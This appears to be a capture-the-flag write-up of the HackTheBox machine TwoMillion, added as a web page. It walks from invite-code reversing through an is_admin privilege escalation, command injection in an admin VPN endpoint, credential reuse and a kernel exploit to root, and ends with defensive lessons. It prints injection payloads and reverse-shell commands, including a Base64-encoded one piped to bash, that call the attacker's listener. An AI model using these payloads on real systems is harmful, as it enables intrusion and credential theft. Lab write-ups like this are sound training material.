@@ -1,0 +1,303 @@
+import Bild from "../../components/Bild.astro";
+import Code from "../../components/Code.astro";
+import Block from "../../components/Block.astro";
+import Marker from "../../components/Marker.astro";
+
+**Disclaimer**: The steps for this writeup are based on my notes and memory, so they might not be 100% accurate. Additionally, I have changed the flags for this writeup, so they won't match the ones on the machine.
+
+Starting with a full TCP port scan and then running service detection against the discovered ports reveals two open ports:
+
+<Block
+  language="Text"
+  content={"22/tcp - SSH / OpenSSH 8.9p1 Ubuntu\n80/tcp - HTTP / nginx"}
+/>
+
+The HTTP service redirects to <Code content="http://2million.htb/"/>. Adding the hostname to the local hosts file and opening the web application reveals an invite-code page. An invite code is required before an account can be created.
+
+<Bild
+  src="/images/writeups/twomillion-invite.png"
+  alt={"TwoMillion invite code page"}
+  width={1920}
+  height={1080}
+/>
+
+I started by looking through the web application's JavaScript. One of the JavaScript files contained an obfuscated function wrapped in an <Code content="eval"/> call. The last part of the obfuscated code contained a list of replacement strings. These strings made it possible to reconstruct the actual functions.
+
+The relevant functions were <Code content="verifyInviteCode" /> and <Code content="makeInviteCode" />. Deobfuscating them revealed the following API requests:
+
+<Block
+  language="JavaScript"
+  content={"function verifyInviteCode(code) {\n  var formData = { code: code };\n  $.ajax({\n    type: \"POST\",\n    dataType: \"json\",\n    data: formData,\n    url: \"/api/v1/invite/verify\",\n    success: function(response) { console.log(response); },\n    error: function(response) { console.log(response); }\n  });\n}\n\nfunction makeInviteCode() {\n  $.ajax({\n    type: \"POST\",\n    dataType: \"json\",\n    url: \"/api/v1/invite/how/to/generate\",\n    success: function(response) { console.log(response); },\n    error: function(response) { console.log(response); }\n  });\n}"}
+/>
+
+The <Code content="makeInviteCode" /> function was particularly interesting because it exposed an endpoint that appeared to explain how invite codes are generated. I sent a POST request to it:
+
+<Block
+  language="Bash"
+  content={"curl -X POST http://2million.htb/api/v1/invite/how/to/generate"}
+/>
+
+The response contained an encoded message and explicitly stated that the encoding type was ROT13:
+
+<Block
+  language="JSON"
+  content={
+    '{\n  \"0\": 200,\n  \"success\": 1,\n  \"data\": {\n    \"data\": \"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\\\/ncv\\\\/i1\\\\/vaivgr\\\\/trarengr\",\n    \"enctype\": \"ROT13\"\n  },\n  \"hint\": \"Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\"\n}'
+  }
+/>
+
+Decoding the ROT13 message produced the instruction to make a POST request to <Code content="/api/v1/invite/generate" />.
+
+I followed that instruction:
+
+<Block
+  language="Bash"
+  content={
+    "curl -X POST http://2million.htb/api/v1/invite/generate"
+  }
+/>
+
+The response contained the following value:
+
+<Block
+  language="JSON"
+  content={
+    '{\n  \"0\": 200,\n  \"success\": 1,\n  \"data\": {\n    \"code\": \"MDZWWDUtMFBGUUYtMlJaVkgtRjYzWVM=\",\n    \"format\": \"encoded\"\n  }\n}'
+  }
+/>
+
+The response explicitly described the value as encoded. The string also had the typical structure of Base64, including the trailing <Code content="=" /> padding character. Decoding it with Base64 produced the actual invite code:
+
+<Block
+  language="Bash"
+  content={
+    "echo \"MDZWWDUtMFBGUUYtMlJaVkgtRjYzWVM=\" | base64 -d"
+  }
+/>
+
+The decoded invite code was:
+
+<Block language="Text" content={"06VX5-0PFQF-2RZVH-F63YS"} />
+
+I used this code on the invite page and continued with the registration process. After logging in, the application displayed the main dashboard.
+
+<Bild
+  src={
+    "/images/writeups/twomillion-dashboard.png"
+  }
+  alt={"TwoMillion dashboard after logging in"}
+  width={1920}
+  height={1080}
+/>
+
+At this point I had a valid authenticated session. The application used a <Code content="PHPSESSID" /> cookie, which could be supplied to <Code content="curl" /> when interacting with authenticated API endpoints.
+
+I first started looking for additional API endpoints. I initially considered using a generic API wordlist with <Code content="ffuf" />, but the wordlist I had selected already contained paths such as <Code content="/api" /> and <Code content="/api/v1" />. This made that particular fuzzing approach less useful than expected. I switched to other enumeration methods instead.
+
+The JavaScript already revealed several API endpoints, so I continued by looking at the API itself. Requesting <Code content="/api/v1" /> with the authenticated session disclosed a complete API route list:
+
+<Block
+  language="JSON"
+  content={
+    '{\n  \"v1\": {\n    \"user\": {\n      \"GET\": {\n        \"/api/v1\": \"Route List\",\n        \"/api/v1/invite/how/to/generate\": \"Instructions on invite code generation\",\n        \"/api/v1/invite/generate\": \"Generate invite code\",\n        \"/api/v1/invite/verify\": \"Verify invite code\",\n        \"/api/v1/user/auth\": \"Check if user is authenticated\",\n        \"/api/v1/user/vpn/generate\": \"Generate a new VPN configuration\",\n        \"/api/v1/user/vpn/regenerate\": \"Regenerate VPN configuration\",\n        \"/api/v1/user/vpn/download\": \"Download OVPN file\"\n      },\n      \"POST\": {\n        \"/api/v1/user/register\": \"Register a new user\",\n        \"/api/v1/user/login\": \"Login with existing user\"\n      }\n    },\n    \"admin\": {\n      \"GET\": {\n        \"/api/v1/admin/auth\": \"Check if user is admin\"\n      },\n      \"POST\": {\n        \"/api/v1/admin/vpn/generate\": \"Generate VPN for specific user\"\n      },\n      \"PUT\": {\n        \"/api/v1/admin/settings/update\": \"Update user settings\"\n      }\n    }\n  }\n}'
+  }
+/>
+
+The route list immediately separated the API into normal-user and administrator functionality. Before trying to access the administrator functionality, I checked the authentication endpoints.
+
+<Block
+  language="Bash"
+  content={
+    "curl -s -H 'Cookie: PHPSESSID=ek00nc80nuk0q29sp6dhbo6tlh' http://2million.htb/api/v1/admin/auth | jq"
+  }
+/>
+
+The response showed that the current account was not an administrator:
+
+<Block
+  language="JSON"
+  content={
+    '{\n  \"message\": false\n}'
+  }
+/>
+
+I also checked the normal user authentication endpoint:
+
+<Block
+  language="Bash"
+  content={
+    "curl -s -H 'Cookie: PHPSESSID=ek00nc80nuk0q29sp6dhbo6tlh' http://2million.htb/api/v1/user/auth | jq"
+  }
+/>
+
+This returned:
+
+<Block
+  language="JSON"
+  content={
+    '{\n  \"loggedin\": true,\n  \"username\": \"dafinndus\",\n  \"is_admin\": 0\n}'
+  }
+/>
+
+I initially investigated the VPN functionality because generating VPN configurations seemed like a potentially interesting place for server-side command execution. The normal VPN endpoints generated or downloaded an <Code content=".ovpn" /> configuration, but they did not immediately provide an obvious attack path.
+
+The API route list also exposed an administrator settings endpoint:
+
+<Code content="/api/v1/admin/settings/update" />
+
+I tested it with my authenticated session. My first request did not specify a content type:
+
+<Block
+  language="Bash"
+  content={
+    "curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie \"PHPSESSID=ek00nc80nuk0q29sp6dhbo6tlh\""
+  }
+/>
+
+The server responded with:
+
+<Block language="JSON" content={'{"status":"danger","message":"Invalid content type."}'} />
+
+I tried the JSON content type:
+
+<Block
+  language="Bash"
+  content={
+    "curl -X PUT --cookie \"PHPSESSID=ek00nc80nuk0q29sp6dhbo6tlh\" -H \"Content-Type: application/json\" http://2million.htb/api/v1/admin/settings/update"
+  }
+/>
+
+This time the API told me exactly what parameter was missing:
+
+<Block language="JSON" content={'{"status":"danger","message":"Missing parameter: email"}'} />
+
+I supplied an email address:
+
+<Block
+  language="Bash"
+  content={
+    "curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie \"PHPSESSID=ek00nc80nuk0q29sp6dhbo6tlh\" -H \"Content-Type: application/json\" -d '{\"email\": \"dafinndus@test.com\"}' | jq -r"
+  }
+/>
+
+The response then requested an <Code content="is_admin" /> parameter:
+
+<Block language="JSON" content={'{"status":"danger","message":"Missing parameter: is_admin"}'} />
+
+At this point I tried setting <Code content="is_admin" /> to <Code content="1" />:
+
+<Block
+  language="Bash"
+  content={
+    "curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie \"PHPSESSID=ek00nc80nuk0q29sp6dhbo6tlh\" -H \"Content-Type: application/json\" -d '{\"email\": \"dafinndus@test.com\", \"is_admin\": 1}' | jq -r"
+  }
+/>
+
+The API accepted the request and returned my user with administrator privileges:
+
+<Block
+  language="JSON"
+  content={
+    '{\n  \"id\": 13,\n  \"username\": \"dafinndus\",\n  \"is_admin\": 1\n}'
+  }
+/>
+
+The application therefore trusted the client-supplied <Code content="is_admin" /> value when updating user settings. This provided a direct privilege escalation from a normal account to an administrator account.
+
+With administrator privileges, I returned to the VPN functionality. The administrator route was described as generating a VPN configuration for a specific user. This was more interesting than the normal-user VPN endpoints because it suggested that a username was supplied to the server-side VPN generation process.
+
+I first tried passing shell syntax in the username parameter. Some attempts did not reach the expected parameter parser, but eventually I used:
+
+<Block
+  language="Bash"
+  content={
+    "curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie \"PHPSESSID=ek00nc80nuk0q29sp6dhbo6tlh\" -H \"Content-Type: application/json\" -d '{\"username\": \"test;whoami;\"}'"
+  }
+/>
+
+The response was:
+
+<Block language="Text" content={"www-data"} />
+
+This confirmed that the value of <Code content="username" /> was being incorporated into a command executed by the web server. The <Code content=";\" /> shell separator allowed another command to be executed, resulting in command injection.
+
+I then tried to use the injection to obtain a reverse shell. My first attempt used a direct Bash TCP connection:
+
+<Block
+  language="Bash"
+  content={
+    "curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie \"PHPSESSID=ek00nc80nuk0q29sp6dhbo6tlh\" -H \"Content-Type: application/json\" -d '{\"username\": \"test;bash -i >& /dev/tcp/10.10.14.132/4444 0>&1;\"}'"
+  }
+/>
+
+This did not produce a connection. I then Base64-encoded the shell command and had the target decode it and pipe it to Bash:
+
+<Block
+  language="Bash"
+  content={
+    "curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie \"PHPSESSID=ek00nc80nuk0q29sp6dhbo6tlh\" -H \"Content-Type: application/json\" -d '{\"username\": \"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzIvNDQ0NCAwPiYxCg== | base64 -d | bash;\"}'"
+  }
+/>
+
+This worked and provided a reverse shell as <Code content="www-data" />.
+
+From the spawned shell I inspected the web application's directory:
+
+<Block language="Bash" content={"cd /var/www/html"} />
+
+The environment file contained database credentials:
+
+<Block
+  language="Text"
+  content={
+    "DB_HOST=127.0.0.1\nDB_DATABASE=htb_prod\nDB_USERNAME=admin\nDB_PASSWORD=SuperDuperPass123"
+  }
+/>
+
+I also checked the local home directories:
+
+<Block language="Bash" content={"ls /home"} />
+
+The only user home directory was <Code content="/home/admin" />. Since the recovered password belonged to the database user <Code content="admin" />, I tested whether the same credentials were reused for the local administrator account. SSH access succeeded, providing a shell as <Code content="admin" />.
+
+As the administrator user, I searched for files owned by the <Code content="admin" /> account:
+
+<Block
+  language="Bash"
+  content={
+    "find / -user admin 2>/dev/null | grep -v proc"
+  }
+/>
+
+Most of the results were normal files in the administrator's home directory, but one stood out:
+
+<Block language="Text" content={"/var/mail/admin"} />
+
+The mail contained an explicit warning about the host's Linux kernel:
+
+<Block
+  language="Text"
+  content={
+    "From: ch4p <ch4p@2million.htb>\nTo: admin <admin@2million.htb>\nCc: g0blin <g0blin@2million.htb>\nSubject: Urgent: Patch System OS\n\nHey admin,\n\nI'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.\n\nHTB Godfather"
+  }
+/>
+
+The reference to OverlayFS and FUSE strongly suggested CVE-2023-0386, a Linux kernel local privilege-escalation vulnerability. I checked the running kernel version:
+
+<Block language="Bash" content={"uname -r"} />
+
+The kernel matched the vulnerable version used by the machine, confirming that the mail was pointing toward the intended local privilege-escalation path.
+
+I used a public proof of concept for CVE-2023-0386 from <Marker content="DataDog security-labs-pocs" link="https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/overlayfs-cve-2023-0386" />. After compiling/executing the PoC on the target, the exploit successfully elevated the shell to <Code content="root" />.
+
+This completed the privilege-escalation chain from the initial web application to root.
+
+**Client-side data must not be trusted for authorization**: The <Code content="/api/v1/admin/settings/update" /> endpoint accepted an <Code content="is_admin" /> value supplied by the client. Setting it to <Code content="1" /> directly changed my normal account into an administrator.
+
+**Obfuscated JavaScript is not a security boundary**: The invite-generation functionality was hidden behind JavaScript obfuscation, but the browser still needed the endpoint and its parameters. Reversing the obfuscation exposed the API routes directly.
+
+**APIs can disclose their own attack surface**: Requesting <Code content="/api/v1" /> returned a complete list of user and administrator routes. This was considerably more useful than blindly fuzzing the entire web application.
+
+**Encoding is not encryption**: The invite-generation process used ROT13 followed by Base64. Neither provides confidentiality. The API even disclosed the encoding type in its response.
+
+**Command injection can hide inside functionality that appears harmless**: The administrator VPN generator accepted a username and incorporated it into a server-side command. A value such as <Code content="test;whoami;" /> was sufficient to execute an additional command as <Code content="www-data" />.
